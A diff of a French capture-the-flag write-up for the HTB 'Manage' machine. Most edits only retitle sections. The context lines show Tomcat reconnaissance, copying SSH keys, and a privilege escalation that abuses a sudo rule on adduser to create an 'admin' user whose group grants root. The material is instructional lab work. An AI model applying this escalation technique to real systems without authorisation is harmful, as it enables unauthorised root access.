@@ -1,6 +1,7 @@
 ---
 
 
+
 # === Archetype: writeups (Page Bundle) ===
 # Copié vers content/writeups/<nom_ctf>/index.md
 
@@ -163,7 +164,7 @@ Le scan ciblé CMS (`mes_scans/cms_vuln_scan.txt`) ne met rien de vraiment explo
 
 Le scan UDP rapide (`mes_scans/udp_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
 
-### Scan répertoires
+### Scan des répertoires
 
 Pour la partie découverte de chemins web, j’utilise mon script dédié {{< script "mon-recoweb" >}} sur le service Tomcat :
 
@@ -224,7 +225,7 @@ Les résultats principaux :
 
 En approfondissant sur `/docs` et `/examples` (nouveaux `mon-recoweb` ciblés), aucun répertoire ou fichier applicatif intéressant n'est découvert : uniquement la documentation Tomcat standard et les exemples, sans appli custom de type “manage” ou panneau d’admin dédié.
 
-### Scan vhosts
+### Scan des vhosts
 
 Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}} :
 
@@ -617,7 +618,7 @@ drwxr-xr-x 2 kali kali   0 Jun 21  2024 ..
 
 ## Escalade de privilèges
 
-- connexion à manage.htb
+### connexion à manage.htb
 
 ```bash
 cp .ssh/id* /home/kali/tmp/ 
@@ -673,6 +674,8 @@ useradmin@manage:~$
 - nous voilà connecté à manage.htb
 - commençons par le classique `sudo -l`
 
+### sudo -l
+
 ```bash
 sudo -l
 Matching Defaults entries for useradmin on manage:
@@ -685,11 +688,14 @@ User useradmin may run the following commands on manage:
     
 ```
 
+### adduser admin
+
 - La règle sudo **(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$** autorise useradmin à lancer `adduser` **sans mot de passe**, mais uniquement avec un argument composé de caractères alphanumériques.
 - Cette restriction empêche d’ajouter directement un utilisateur à un groupe privilégié (ex. `sudo`, `adm`, etc.) puisqu’on ne peut pas passer d’options.
 - Lorsqu’on crée un utilisateur `admin`, Ubuntu crée automatiquement **un groupe du même nom** : `admin`.
 - **Historiquement**, dans Ubuntu, le groupe `admin` appartient aux *sudoers* et possède des droits équivalents à `sudo` (héritage des anciennes versions où `admin` = super-user local).
 - **Résultat : l’utilisateur `admin` nouvellement créé peut exécuter `sudo -i` et obtenir un shell root immédiatement.**
+
 
 ```bash
 
@@ -710,7 +716,13 @@ Enter the new value, or press ENTER for the default
 	Home Phone []: 
 	Other []: 
 Is the information correct? [Y/n] 
+useradmin@manage:~$
 
+```
+
+### su admin
+
+```bash
 useradmin@manage:~$ su admin
 Password: 
 To run a command as administrator (user "root"), use "sudo <command>".
